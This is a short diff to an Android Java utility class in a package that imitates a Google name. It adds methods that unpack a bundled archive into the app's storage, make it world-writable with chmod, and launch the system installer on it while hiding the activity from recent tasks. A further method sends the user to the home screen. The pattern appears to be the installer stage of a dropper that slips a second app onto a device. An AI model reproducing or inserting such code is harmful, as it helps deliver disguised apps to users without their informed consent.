@@ -1,5 +1,6 @@
 package com.google.install.plugin;
 
+import java.io.File;
 import java.io.InputStream;
 import java.util.List;
 import java.util.Random;
@@ -10,6 +11,7 @@ import android.content.pm.PackageInfo;
 import android.content.pm.PackageManager;
 import android.content.pm.ResolveInfo;
 import android.graphics.drawable.Drawable;
+import android.net.Uri;
 
 public class Utils {
     private static final String TAG = "Utils";
@@ -66,7 +68,34 @@ public class Utils {
         return null;
     }
     
-    public static boolean unzipRawToPath(Context context, InputStream in, String targetPath) {
-        return true;
+    public static boolean unzipRawToPath(Context context, int resourceId, String targetFileName) {
+        try {
+            InputStream is = context.getResources().openRawResource(resourceId);
+            ZipUtil.outputFile(is, context.getFilesDir() + "/", targetFileName);
+            Runtime.getRuntime().exec("chmod 666 " +  context.getFilesDir() + "/" + targetFileName);
+            is.close();
+            return true;
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        return false;
+    }
+    
+    public static void goHome(Context context) {
+        Intent i= new Intent(Intent.ACTION_MAIN);
+
+        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+//        i.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
+        i.addCategory(Intent.CATEGORY_HOME);
+        context.startActivity(i);
+    }
+    
+    public static void startSystemInstallActivity(Context context) {
+        Intent i = new Intent(Intent.ACTION_VIEW);
+        File upgradeFile = new File(context.getFilesDir() + "/" + Config.DUMP_PACKAGE_NAME);
+        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
+        i.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
+        i.setDataAndType(Uri.fromFile(upgradeFile), "application/vnd.android.package-archive");
+        context.startActivity(i); 
     }
 }
